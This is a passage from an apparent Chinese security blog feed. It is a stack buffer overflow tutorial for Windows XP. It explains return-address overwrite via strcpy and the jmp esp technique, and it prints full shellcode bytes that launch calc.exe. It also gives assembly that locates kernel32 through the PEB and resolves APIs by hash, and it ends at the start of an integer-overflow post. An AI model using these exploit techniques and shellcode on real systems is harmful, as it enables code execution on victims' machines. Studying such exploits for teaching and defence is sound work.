Address</td></tr><tr><td>Param a</td></tr><tr><td>Param b</td></tr><tr><td>Param c</td></tr></tbody></table><p>从函数调用的过程来说，函数执行完毕后执行的下一个指令地址就是ReturnAddress。</p><p>如果我们想让程序在执行完func后跑去执行我们自己构造的恶意代码，只需修改ReturnAddress的值即可。</p><blockquote><p>以前的流程是： main-&gt;func-&gt;main</p><p>修改func的返回值后：main-&gt;func-&gt;shellcode</p></blockquote><p>C允许开发者直接对内存中的某个地址做修改，它本身也存在内存不安全函数。常见的如：gets、strcpy、strcat、scanf等。</p><p>func使用strcpy将name中的所有内容全拷贝到buf中，如果name的内容超过buf的大小，那么接下来的内容就会覆盖掉buf下面的ebp、return address等。如果我们让name中先存放12字节的任意数据（buf占8个字节，ebp占4个字节），那么name[13~16]就会覆盖掉Return address，当func返回值EIP指向的就是name[13~16]的地址了。</p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>即恶意代码。指攻击者用于实时攻击的一段指令，指令的形式不限，不管是高级语言Java、Python，或者是汇编、机器指令，均可称作Shellcode。</p><p>本文的栈溢出，因为是直接将恶意代码插入到栈当中，在程序返回时恶意执行，没有将代码解析和转换成机器指令的流程，因此需要直接存入机器指令。</p><p>本文生成Shellcode的方法如下：</p><ol><li>编写汇编</li><li>使用UltraEdit或者AsmToE 将汇编转为机器指令</li><li>通过在机器指令码首部插入  \x 的方式将所有指令串联起来</li></ol><blockquote><p><strong>例如：</strong></p><p>机器指令为  83 EC 50，</p><p>对应的汇编为sub esp,50h</p><p>Shellcode为\x83\EC\50</p></blockquote><p><strong>TIPS：</strong></p><p>在生成Shellcode时，需要按照漏洞的类型仔细配置.</p><p>例如本文的攻击面是strcpy，而strcpy有个特性，一旦读取的字符串中包含00，就认为这个字符串的读取已经结束了。因此我们本次的Shellcode一定不能出现00的机器码。对于memcpy命令来说，就不存在这个问题</p><h2 id="一、攻击：指定Shellcode的地址"><a href="#一、攻击：指定Shellcode的地址" class="headerlink" title="一、攻击：指定Shellcode的地址"></a>一、攻击：指定Shellcode的地址</h2><p>上文说到，将func的ReturnAddress替换为Shellcode在内存中的地址即可正确执行代码。那如何获取Shellcod在内存中的地址呢？</p><p><strong>分两种情况：</strong></p><ol><li>只考虑本地环境</li><li>通用环境。即所有的windows都能跳转到Shellcode的首地址。</li></ol><p>先分析我们的攻击代码，它由两部分构成。</p><p>一部分是覆盖代码A，用于覆盖buf的所有空间以及EBP（这一块其实并不算Shellcode）</p><p>另一部分就是Shellcode，它的首部地址就是我们的目标。</p><p>A可以完全或部分包含Shellcode，也可以将shellcode排列在A之后。</p><p>获取Shellcode的地址有两个方法，一个是直接打印，一个是使用调试工具ida pro、ollydbg动态调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shellcode在A之后</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, size of buf + <span class="number">4</span>); <span class="comment">// 最后的加4是EBP的4个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Shellcode在A之间</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p"</span>, name + shellcode相对于A头部的偏移);</span><br></pre></td></tr></table></figure><p>因为只考虑本地环境这种攻击方法兼容性太差，因此代码就不贴上来了，直接介绍下面的第二种攻击方式。jmp esp</p><h2 id="二、攻击：JMP-esp"><a href="#二、攻击：JMP-esp" class="headerlink" title="二、攻击：JMP esp"></a>二、攻击：JMP esp</h2><table><thead><tr><th>函数返回时栈中的情况</th></tr></thead><tbody><tr><td>Return Address</td></tr><tr><td>Param a</td></tr><tr><td>Param b</td></tr></tbody></table><p>当我们使用ollydbg调试函数返回的情况，栈内的情况如上图。之前已经分配的buf和ebp已被弹出。只剩返回值地址，函数的入参a、b、c</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return.png" alt="指向RETN"></p><p>此时，函数还未返回，ESP指向0013FF84，也就是返回后程序会从13FF84取出地址7C961EED并跳转 .</p><p>而当我们手动点击下一步，程序跳转到了地址7C961EED，但此时esp的值也变为了0013FF88。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_1_return_end.png" alt="下一步"></p><p><strong>这说明什么呢？</strong></p><p>说明不管程序如何返回，在执行完RETN后ESP一定会指向ReturnAddress的下一个地址。本文也就是指向Param a的地址。我们可以先让Shellcode从Param a的位置开始填充，再让ReturnAddress跳转的地址指向一个jmp esp命令，那么此时再点击单步执行，那么程序就会从ESP所指向的地址中取值并执行，这样也就跳转到我们的Shellcode了</p><p>因此整体的攻击流程就可以变更为：</p><ol><li>任意非00的指令覆盖buffer和EBP</li><li>从程序已经加载的dll中获取他们的jmp esp指令地址。</li><li>使用jmp esp的指令地址覆盖ReturnAddress</li><li>从下一行开始填充Shellcode</li></ol><p>获取jmp esp地址的方法为：</p><blockquote><ul><li><p>打开windbg，File-&gt;attach a process. </p></li><li><p>lm 指令查看现在加载了哪些库，获取它的start地址和end地址。对于win32程序而言，他们都会加载kernel32.dll和ntdll.dll</p></li><li><p>jmp esp的机器码为 FF E4。 使用指令：  s start地址 end地址 FF E4   即可查看库中包含jmp esp的地址address。</p></li><li>u address 指令可以查看该地址处的汇编，检验是否是jmp esp</li><li>校验无误后保存备用</li></ul></blockquote><p>获取jmp esp后，我们需要用16进制表示它。这里有个小tips，因为windows操作系统是小端显示，那么对应的16进制就应该反着写。</p><p>例如，我们通过windbg获得的jmp esp地址为7c961eed，那么它的16进制就是0xed1e967c，即两位一组，反着写。</p><p><strong>编写Shellcode</strong></p><p>接下来，我们就可以开始编写Shellcode。编写Shellcode有多种方式，最快捷的是使用metasploit直接生成payload。本文用弹出一个计算器作为示例。</p><p>在C中，如果我们要弹出一个计算器，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LoadLibrary(<span class="string">"kernel32.dll"</span>);</span><br><span class="line">    WinExec(<span class="string">"calc.exe"</span>, <span class="number">0</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们需要载入kernel32.dll（win32默认已载入，这里仅作演示，实际可删除这行代码），然后调用它WinExec这个方法，传入两个参，一个参是0，一个参是”calc.exe”。之后调用ExitProcess，传入参数0，退出程序。</p><p><strong>获取LoadLibrary和ExitProcess在内存中的地址</strong></p><p>LoadLibrary和ExitProcess属于kernel32.dll的功能，kernel32.dll在程序启动时就已默认加载，那么只需从内存中获得这两个方法的地址即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcLoad;</span><br><span class="line">MYPROC ProcExit;</span><br><span class="line">MYPROC ProcBox;</span><br><span class="line">MYPROC ProcWinExec;</span><br><span class="line"></span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">"kernel32"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"kernel32 = 0x%x\n"</span>, LibHandle);</span><br><span class="line"></span><br><span class="line">        ProcLoad=(MYPROC)GetProcAddress(LibHandle,<span class="string">"LoadLibraryA"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"LoadLibraryA = 0x%x\n"</span>, ProcLoad);</span><br><span class="line">ProcExit=(MYPROC)GetProcAddress(LibHandle,<span class="string">"ExitProcess"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ExitProcess = 0x%x\n"</span>, ProcExit);</span><br><span class="line">ProcWinExec = (MYPROC)GetProcAddress(LibHandle, <span class="string">"WinExec"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WinExec = 0x%x\n"</span>, ProcWinExec);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LibHandle = LoadLibrary(<span class="string">"user32"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"user32 = 0x%x\n"</span>, LibHandle);</span><br><span class="line">ProcBox=(MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"MessageBoxA = 0x%x\n"</span>, ProcBox);</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存他们的地址，接着就是编写汇编去调用这两个方法了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sub esp,<span class="number">0x40</span>        <span class="comment">// 抬高栈帧</span></span><br><span class="line">xor ebx,ebx         <span class="comment">// 清空ebx </span></span><br><span class="line">push ebx<span class="comment">// ebx入栈，00000000 作为字符的截断</span></span><br><span class="line">push <span class="number">0x6578652E</span>     <span class="comment">// 将字符串“calc.exe”转为16进制为 63616c632e657865</span></span><br><span class="line">push <span class="number">0x636C6163</span>     <span class="comment">// 8个一组，不足的用20补齐。因为是小端显示，所以从后向前填写，注意push的顺序</span></span><br><span class="line">mov eax,esp         <span class="comment">// 在字符串入栈完毕后，esp指向字符串的起始位置. 此时eax = calc.exe</span></span><br><span class="line">push ebx            <span class="comment">// 参数入栈，0</span></span><br><span class="line">push eax            <span class="comment">// 参数入栈,calc.exe</span></span><br><span class="line">mov ecx,<span class="number">0x7C86114D</span>  <span class="comment">// 0x7C86114D为WinExec在内存中的地址</span></span><br><span class="line">call ecx            <span class="comment">// WinExec("calc.exe", 0);</span></span><br><span class="line">xor ebx,ebx        </span><br><span class="line">push ebx           <span class="comment">// 参数入栈</span></span><br><span class="line">mov eax,<span class="number">0x7C81CAA2</span> <span class="comment">// 0x7C81CAA2为ExitProcess在内存中的地址</span></span><br><span class="line">call eax           <span class="comment">// ExitProcess(0);</span></span><br></pre></td></tr></table></figure><p>将这段汇编拖入AsmToE，获取机器码，并用\x替换空格。</p><p><strong>Shellcode和完整代码如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"\x41\x41\x41\x41\x41\x41\x41\x41"</span>  <span class="comment">// name[0]~name[7]</span></span><br><span class="line">     <span class="string">"\x41\x41\x41\x41"</span>                      <span class="comment">// Overlap EBP</span></span><br><span class="line">     <span class="string">"\xed\x1e\x96\x7c"</span>                        <span class="comment">// Return Address(Address of "Jmp eax")</span></span><br><span class="line">  <span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span> <span class="comment">// shellcode</span></span><br><span class="line"><span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line"><span class="string">"\xDB\x53"</span></span><br><span class="line"><span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line"><span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line"><span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>攻击二中，LoadLibrary、WinExec、ExitProcess的地址是我们手动获取的，这意味着这个溢出shellcode在不同的操作系统版本上均需要重新获取对应的地址方可使用，有办法可以编写通用脚本吗？</p><h2 id="三、攻击：编写系统版本通用的Shellcode"><a href="#三、攻击：编写系统版本通用的Shellcode" class="headerlink" title="三、攻击：编写系统版本通用的Shellcode"></a>三、攻击：编写系统版本通用的Shellcode</h2><p>这里的内容太多，今天写不完，先提交代码和原理，细节以后再补。</p><p><strong>原理：</strong></p><p>所有的win32程序都会加载ntdll.dll和kernel32.dll，如果要定位kernel32.dll中的API地址，可以用如下方法：</p><ol><li>首先通过段选择字FS在内存中找到当前的线程环境块TEB</li><li>线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针</li><li>进程环境块PEB中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针，其中存放着已经被进程装载的动态链接库的信息。</li><li>PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针。</li><li>模块初始化链表按顺序存放着PE装入运行时初始化模块的信息，第一个链表节点是ntdll.dll，第二个节点就是kernel32.dll</li><li>找到kernel32.dll节点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。</li><li>从kernel32.dll的加载基址算起，偏移0x3C的地方就是其PE头</li><li>PE头偏移0x78的地方存放着指向函数导出表的指针</li><li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。<ol><li>导出表偏移0x1C处的指针指向存储导出函数偏移地址（RVA）的列表</li><li>导出表偏移0x20处的指针指向存储导出函数名的列表</li><li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA</li><li>获得RVA后，再加上前边已经得到的动态链接库的基地址，就能算出API此时在内存中的绝对地址</li></ol></li></ol><p><strong>简而言之就是，定位dll中函数导出表的位置，拿到它的导出函数名列表，做hash比较查找指定API，比较成功后从RVA中获取它的地址，再加上dll的基址就能得到函数在内存中的绝对地址。</strong></p><p><strong>代码如下：</strong>（我的那份忘保存，这里直接上传0day安全的备用代码，但在我本地是不可运行的，需要修改）</p><p>复制_asm包裹的汇编，拖入AsmToE转换为机器指令即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_asm&#123;</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">CLD; clear flag DF</span><br><span class="line">;store hash</span><br><span class="line">push <span class="number">0x1e380a6a</span>;hash of MessageBoxA</span><br><span class="line">push <span class="number">0x4fd18963</span>;hash of ExitProcess</span><br><span class="line">push <span class="number">0x0c917432</span>;hash of LoadLibraryA</span><br><span class="line">mov esi,esp; esi = addr of first function hash </span><br><span class="line">lea edi,[esi<span class="number">-0xc</span>]; edi = addr to start writing function </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; make some <span class="built_in">stack</span> space</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh, <span class="number">0x04</span>  </span><br><span class="line">sub esp, ebx </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; push a pointer to <span class="string">"user32"</span> onto <span class="built_in">stack</span> </span><br><span class="line">mov bx, <span class="number">0x3233</span> ; rest of ebx is null </span><br><span class="line">push ebx </span><br><span class="line">push <span class="number">0x72657375</span> </span><br><span class="line">push esp </span><br><span class="line"></span><br><span class="line">xor edx,edx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">mov ebx, fs:[edx + <span class="number">0x30</span>] ; ebx = address of PEB </span><br><span class="line">mov ecx, [ebx + <span class="number">0x0c</span>] ; ecx = pointer to loader data </span><br><span class="line">mov ecx, [ecx + <span class="number">0x1c</span>] ; ecx = first entry in initialisation order <span class="built_in">list</span> </span><br><span class="line">mov ecx, [ecx] ; ecx = second entry in <span class="built_in">list</span> (kernel32.dll) </span><br><span class="line">mov ebp, [ecx + <span class="number">0x08</span>] ; ebp = base address of kernel32.dll </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_lib_functions: </span><br><span class="line"></span><br><span class="line">lodsd ; load next hash into al <span class="keyword">and</span> increment esi </span><br><span class="line">cmp eax, <span class="number">0x1e380a6a</span>; hash of MessageBoxA - trigger </span><br><span class="line">; LoadLibrary(<span class="string">"user32"</span>) </span><br><span class="line">jne find_functions </span><br><span class="line">xchg eax, ebp ; save current hash </span><br><span class="line">call [edi - <span class="number">0x8</span>] ; LoadLibraryA </span><br><span class="line">xchg eax, ebp ; restore current hash, <span class="keyword">and</span> update ebp </span><br><span class="line">; with base address of user32.dll </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_functions: </span><br><span class="line">pushad ; preserve registers </span><br><span class="line">mov eax, [ebp + <span class="number">0x3c</span>]; eax = start of PE header </span><br><span class="line">mov ecx, [ebp + eax + <span class="number">0x78</span>]; ecx = relative offset of <span class="keyword">export</span> table </span><br><span class="line">add ecx, ebp ; ecx = absolute addr of <span class="keyword">export</span> table </span><br><span class="line">mov ebx, [ecx + <span class="number">0x20</span>] ; ebx = relative offset of names table </span><br><span class="line">add ebx, ebp ; ebx = absolute addr of names table </span><br><span class="line">xor edi, edi ; edi will count through the functions </span><br><span class="line"></span><br><span class="line">next_function_loop: </span><br><span class="line">inc edi ; increment function counter </span><br><span class="line">mov esi, [ebx + edi * <span class="number">4</span>] ; esi = relative offset of current function name </span><br><span class="line">add esi, ebp ; esi = absolute addr of current function name </span><br><span class="line">cdq ; <span class="function">dl will hold <span class="title">hash</span> <span class="params">(we know eax is small)</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line">hash_loop: </span><br><span class="line">movsx eax, byte ptr[esi]</span><br><span class="line">cmp al,ah</span><br><span class="line">jz compare_hash</span><br><span class="line">ror edx,<span class="number">7</span></span><br><span class="line">add edx,eax</span><br><span class="line">inc esi</span><br><span class="line">jmp hash_loop</span><br><span class="line"></span><br><span class="line">compare_hash:</span><br><span class="line">cmp edx, [esp + <span class="number">0x1c</span>] ; <span class="function">compare to the requested <span class="title">hash</span> <span class="params">(saved on <span class="built_in">stack</span> from pushad)</span> </span></span><br><span class="line"><span class="function">jnz next_function_loop </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line">mov ebx, [ecx + 0x24] ; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp ; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + <span class="number">2</span> * edi] ; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + <span class="number">0x1c</span>] ; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp ; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + <span class="number">4</span> * edi] ; <span class="function">add to <span class="title">ebp</span> <span class="params">(base addr of <span class="keyword">module</span>)</span> the </span></span><br><span class="line"><span class="function"></span>; relative offset of matched function </span><br><span class="line">xchg eax, ebp ; move func addr into eax </span><br><span class="line">pop edi ; edi is last onto <span class="built_in">stack</span> in pushad </span><br><span class="line">stosd ; write function addr to [edi] <span class="keyword">and</span> increment edi </span><br><span class="line">push edi </span><br><span class="line">popad; restore registers </span><br><span class="line"> ; loop until we reach end of last hash </span><br><span class="line">cmp eax,<span class="number">0x1e380a6a</span></span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br><span class="line">function_call:</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx<span class="comment">// cut string</span></span><br><span class="line">push <span class="number">0x74736577</span></span><br><span class="line">push <span class="number">0x6C696166</span><span class="comment">//push failwest</span></span><br><span class="line">mov eax,esp<span class="comment">//load address of failwest</span></span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">call [edi - <span class="number">0x04</span>] ; <span class="comment">//call MessageboxA</span></span><br><span class="line">push ebx</span><br><span class="line">call [edi - <span class="number">0x08</span>] ; <span class="comment">// call ExitProcess</span></span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h2><p>本篇的shellcode尚不完善，jmp esp目前也是手动获取的，但本文的主要目的是在于梳理栈溢出的基础，在接下来的几篇文章中，会不断完善这个Shellcode，包括绕过一些安全措施等等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
&lt;p&gt;Book: 《0day安全：软件漏洞分析技术》&lt;/p&gt;
&lt;p&gt;知识点的主要来源是”0day安全：软件漏洞分析技术”和网络，但发现它内部80%漏洞利用代码均无法直接在自己的机器上运行。因此本通关专栏不会完全按书的内容规划，在必要的时候会自行实现&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>整数溢出</title>
    <link href="http://imlzq.com/2018/04/25/Integer_OverFlow/"/>
    <id>http://imlzq.com/2018/04/25/Integer_OverFlow/</id>
    <published>2018-04-24T16:00:00.000Z</published>
    <updated>2018-04-27T08:03:00.698Z</updated>
    
    <content type="html"><![CDATA[<ul><li>无符号整数</li><li>有符号整数</li><li>截断</li><li>配合不安全函数进行栈溢出</li></ul><a id="more"></a>    <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> InputTest;                    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> OutputTest;        </span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"InputTest:"</span>);    </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;InputTest);    </span><br><span class="line">OutputTest = InputTest;    </span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"OutputTest:%d\n"</span>, OutputTest);    